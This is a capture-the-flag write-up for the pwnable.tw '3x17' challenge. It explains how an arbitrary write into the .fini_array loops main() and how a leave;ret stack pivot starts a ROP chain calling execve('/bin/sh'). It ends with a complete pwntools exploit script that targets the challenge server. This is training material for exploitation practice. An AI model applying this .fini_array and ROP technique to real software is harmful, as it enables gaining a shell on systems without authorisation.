## 3x17
### Overview
We get arbitray 0x18 bytes write at any location. No way to leak stack so we have to use PIE addresses only. __libc_start_main function was called with main() function pointer as well as an init function and fini function. Researching about fini function, got to know its a kind of destructor and runs after main() returns.

In fini function, it basically reads a fini array in reverse order, and calls whatever pointer is in there. We can just put address of our function main() there. The problem was in this second run, value at 0x4b92e0 is 1, which means main() won't ask for our input and just exits.

To fix this, we add the address of fini_func at fini_array[0], and main at fini_array[1]. What this does is, it first executes main(), which returns, and then executes the fini_func/destructor function, which again executes the pointers in fini_array. 

How does this infinite loop benefit us? On every loop, main function does `data_4b9330 += 1;`, so after 255 runs, it overflows and becomes 0 again, and main will once again ask for our input. With this we can keep writing anything anywhere.

Since NX is enabled, and we can't leak stack, we have to do something at PIE addresses only. Luckily, in fini_func, RBP is set to pointer to `fini_array[0]`.

Before:
 - RBP : 0x4b40f0
 - RSP - \<some stack address>

Now if we call a leave ; ret gadget, what that will do is - 

1. call instruction, when executed will push address of next instruction on stack, and jump to address.
2. leave is conjoint for - 
    ```
    mov rsp, rbp
    pop rbp
    ```
    The pop also increments the RSP, so overall, RBP becomes value at RBP address, and new RSP becomes old RBP+8.

    And now when ret is executed, it just to RBP+8, which here is fini_array[1].

We can let main() function sit at fini_array[1] and write our ROP chain next to it, setting up for syscall. Finally, we write address of leave_ret gadget at fini_array[0], which breaks out of loop and gives us the shell.


```py
from pwn import *

exe = ELF("./3x17_patched")

context.binary = exe
context.log_level = 'debug'
r = ROP(context.binary)

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10105)
    return process([exe.path])

p = conn()

def overwrite(addr, target):
    p.sendafter(b"addr:", str(addr).encode())
    p.sendafter(b"data:", target)

fini_func = 0x402960
fini_0 = 0x4b40f0
main = 0x401b6d

#loop over main, with overflow in checking variable.
overwrite(fini_0,    p64(fini_func) + p64(main))

##syscall to execve
overwrite(fini_0+16, p64(r.rdi.address)+p64(fini_0+160))
overwrite(fini_0+32, p64(r.rsi.address)+p64(0))
overwrite(fini_0+48, p64(r.rax.address)+p64(0x3b))
overwrite(fini_0+64, p64(r.rdx.address)+p64(0))
overwrite(fini_0+80, p64(r.syscall.address)+p64(0))
overwrite(fini_0+160, b"/bin/sh\x00")

#leave; ret;
overwrite(fini_0, p64(r.leave.address)) 

p.interactive()
```